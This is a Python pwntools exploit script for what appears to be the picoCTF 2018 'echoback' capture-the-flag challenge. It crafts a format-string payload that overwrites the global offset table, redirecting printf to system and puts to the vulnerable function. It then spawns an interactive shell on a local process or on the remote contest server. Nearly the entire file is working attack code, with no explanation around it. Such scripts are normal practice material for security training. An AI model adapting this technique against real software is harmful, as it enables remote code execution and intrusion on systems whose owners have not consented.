#! /usr/bin/env python
import os
#
from pwn import context, p32, u32, log, process, remote, args
from pwn import ELF, fmtstr_payload
context.clear(arch='i386', os='linux')


HERE_DIR = os.path.dirname(os.path.abspath(__file__))


class Attack:
    def __init__(self, host, port, elf_name, libc_name=None, ld_linux_name=None, gdb_script=None):
        self.host, self.port = host, port
        self.elf_name, self.libc_name = elf_name, libc_name
        self.ld_linux_name = ld_linux_name
        self.gdb_script = gdb_script

        self.elf = ELF(self.elf_name)

        if libc_name:
            self.libc = ELF(self.libc_name)

        self.p = None


    def get_process(self, ld_preload=False, ld_linux=False):
        p = None
        if args.REMOTE:
            p = remote(self.host, self.port)
        else:
            env = {'LD_PRELOAD': self.libc_name} if ld_preload else None
            argv = []
            if ld_linux:
                argv.append(self.ld_linux_name)

            argv.append(self.elf_name)
            p = process(argv, env=env)
            if args.GDB:
                gdb.attach(p.pid, self.gdb_script)
        return p


    def exploit(self):
        OFFSET_fmt  = 7
        elf = self.elf
        writes = {
            elf.got['printf'] : elf.symbols['system'],
            elf.got['puts'] : elf.symbols['vuln'],
        }

        log.info("Trying to write:")
        for x in writes:
            log.indented("%s : %s", hex(x), hex(writes[x]))

        payload = fmtstr_payload(OFFSET_fmt, writes, write_size='short')

        with self.get_process() as self.p:
            self.p.sendlineafter('message:\n', payload)

            self.p.clean(timeout=1)
            self.p.sendline('/bin/sh')
            self.p.sendline('ls -la')
            log.success('Here\'re your shell!')
            self.p.interactive()


if __name__ == "__main__":
    host, port = '2018shell2.picoctf.com', 37402
    elf_name = 'echoback'
    elf_name = os.path.join(HERE_DIR, elf_name)
    attack = Attack(host, port, elf_name)
    attack.exploit()
